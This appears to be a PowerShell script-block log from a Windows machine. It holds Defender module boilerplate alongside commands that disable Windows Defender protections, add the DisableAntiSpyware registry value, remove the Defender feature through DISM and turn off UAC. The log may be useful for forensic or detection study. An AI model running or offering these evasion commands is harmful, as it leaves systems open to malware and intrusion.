catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_MpRollback.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Start-MpRollback' -Alias '*'\r\n        \r\n"
"function __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}"
"prompt"
"Set-MpPreference -MAPSReporting 0ΓÇï"
"{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"{ Set-StrictMode -Version 1; $_.OriginInfo }"
"prompt"
"Set-MpPreference -DisableRealtimeMonitoring $true"
"function __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}"
"prompt"
"Get-MpComputerStatus | Select-Object -Property Antivirusenabled,AMServiceEnabled,AntispywareEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled,NISEnabled,OnAccessProtectionEnabled,RealTimeProtectionEnabled,IsTamperProtected,AntivirusSignatureLastUpdated"
"prompt"
"{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"{ Set-StrictMode -Version 1; $_.OriginInfo }"
"prompt"
"Dism "
"prompt"
"prompt"
"Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet"
"{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"{ Set-StrictMode -Version 1; $_.OriginInfo }"
"prompt"
"prompt"
"New-ItemProperty -Path ΓÇ£HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows DefenderΓÇ¥ -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force"
"{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"{ Set-StrictMode -Version 1; $_.OriginInfo }"
"prompt"
"Set-MpPreference -DisableRemovableDriveScanning $true"
"prompt"
"Set-MpPreference -DisableArchiveScanning $True"
"prompt"
"Get-MpPreference|select DisableArchiveScanning"
"prompt"
"Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL"
"prompt"
"cmd.exe /c \"C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f\""
null
null
null
"prompt"
"prompt"
"Set-MpPreference -DisableRealtimeMonitoring $true"
"\r\n#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpComputerStatus'\r\n$script:ClassVersion = ''\r\n$script:ModuleVersion = '1.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Get-MpComputerStatus\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\r\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpComputerStatus')]\r\n\r\n    param(\r\n    \r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\r\n\r\n\r\n    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_MpComputerStatus.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-MpComputerStatus' -Alias '*'\r\n        \r\n"
"\r\n#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'root\\Microsoft\\Windows\\Defender\\MSFT_MpPreference'\r\n$script:ClassVersion = '1.0'\r\n$script:ModuleVersion = '1.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Set-MpPreference\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ExclusionPath},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ExclusionExtension},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ExclusionProcess},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ExclusionIpAddress},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('rtsd')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('Both','Incoming','Outcoming')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanDirection]\r\n    ${RealTimeScanDirection},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('qpiad')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${QuarantinePurgeItemsAfterDelay},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('rsd')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('Everyday','Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Never')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day]\r\n    ${RemediationScheduleDay},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('rst')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [datetime]\r\n    ${RemediationScheduleTime},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('repcs')]\r\n    [ValidateSet('NotConfigured','Block','Audit','Off')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.NetworkBehaviorProtectionConfiguredState]\r\n    ${RemoteEncryptionProtectionConfiguredState},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('repmbt')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${RemoteEncryptionProtectionMaxBlockTime},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('repa')]\r\n    [ValidateSet('Low','Medium','High')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Aggressiveness]\r\n    ${RemoteEncryptionProtectionAggressiveness},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('repe')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${RemoteEncryptionProtectionExclusions},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('bfpcs')]\r\n    [ValidateSet('NotConfigured','Block','Audit','Off')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.NetworkBehaviorProtectionConfiguredState]\r\n    ${BruteForceProtectionConfiguredState},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('bfpmbt')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${BruteForceProtectionMaxBlockTime},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('bfpa')]\r\n    [ValidateSet('Low','Medium','High')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Aggressiveness]\r\n    ${BruteForceProtectionAggressiveness},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('bfpe')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${BruteForceProtectionExclusions},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('raat')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${ReportingAdditionalActionTimeOut},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('rcto')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${ReportingCriticalFailureTimeOut},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('rncto')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${ReportingNonCriticalTimeOut},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('shri')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${ServiceHealthReportInterval},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('rdsde')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${ReportDynamicSignatureDroppedEvent},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('saclf')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [byte]\r\n    ${ScanAvgCPULoadFactor},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('csbr')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${CheckForSignaturesBeforeRunningScan},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('spiad')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${ScanPurgeItemsAfterDelay},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('soiie')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${ScanOnlyIfIdleEnabled},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('QuickScan','FullScan')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanType]\r\n    ${ScanParameters},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('scsd')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('Everyday','Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Never')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day]\r\n    ${ScanScheduleDay},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('scsqst')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [datetime]\r\n    ${ScanScheduleQuickScanTime},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('scst')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [datetime]\r\n    ${ScanScheduleTime},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('tfsso')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${ThrottleForScheduledScanOnly},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('sigfagp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${SignatureFirstAuGracePeriod},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('sigagp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${SignatureAuGracePeriod},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('sigdufss')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${SignatureDefinitionUpdateFileSharesSources},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('sigduoswo')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${SignatureDisableUpdateOnStartupWithoutEngine},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('sfo')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${SignatureFallbackOrder},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('ssp','SecurityIntelligenceLocation','ssl')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${SharedSignaturesPath},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('sspsch','SecurityIntelligenceLocationUpdateAtScheduledTimeOnly')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${SharedSignaturesPathUpdateAtScheduledTimeOnly},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('sigsd')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('Everyday','Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Never')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day]\r\n    ${SignatureScheduleDay},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('sigst')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [datetime]\r\n    ${SignatureScheduleTime},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('siguci')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${SignatureUpdateCatchupInterval},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('sigui')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${SignatureUpdateInterval},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('sigbui')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${SignatureBlobUpdateInterval},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('sigbfs')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${SignatureBlobFileSharesSources},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('mcupd')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${MeteredConnectionUpdates},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('anpws')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${AllowNetworkProtectionOnWinServer},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('ddtgp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableDatagramProcessing},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('ecwtb')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${EnableConvertWarnToBlock},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableCpuThrottleOnIdleScans},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('Disabled','Basic','Advanced')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.MAPSReportingType]\r\n    ${MAPSReporting},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('AlwaysPrompt','SendSafeSamples','NeverSend','SendAllSamples')]\r\n    [Microsoft.PowerShell.Cmdletizati"
"on.GeneratedTypes.MpPreference.SubmitSamplesConsentType]\r\n    ${SubmitSamplesConsent},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dae')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableAutoExclusions},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dpm')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisablePrivacyMode},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('rstt')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${RandomizeScheduleTaskTimes},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('srt')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${SchedulerRandomizationTime},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dbm')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableBehaviorMonitoring},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dips')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableIntrusionPreventionSystem},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dioavp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableIOAVProtection},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('drtm')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableRealtimeMonitoring},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dscrptsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableScriptScanning},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('darchsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableArchiveScanning},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dcfsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableCatchupFullScan},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dcqsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableCatchupQuickScan},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('demsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableEmailScanning},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('drdsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableRemovableDriveScanning},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('drp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableRestorePoint},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dsmndfsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableScanningMappedNetworkDrivesForFullScan},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dsnf')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableScanningNetworkFiles},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('adsnftioav')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${ApplyDisableNetworkScanningToIOAV},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${UILockdown},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('tiddefaci')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [long[]]\r\n    ${ThreatIDDefaultAction_Ids},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('tiddefaca')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]]\r\n    ${ThreatIDDefaultAction_Actions},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('unktdefac')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction]\r\n    ${UnknownThreatDefaultAction},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('ltdefac')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction]\r\n    ${LowThreatDefaultAction},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('mtdefac')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction]\r\n    ${ModerateThreatDefaultAction},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('htdefac')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction]\r\n    ${HighThreatDefaultAction},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('stdefac')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction]\r\n    ${SevereThreatDefaultAction},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [switch]\r\n    ${Force},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dbaf')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableBlockAtFirstSeen},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('Disabled','Enabled','AuditMode')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.PUAProtectionType]\r\n    ${PUAProtection},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('Default','Moderate','High','HighPlus','ZeroTolerance')]\r\n    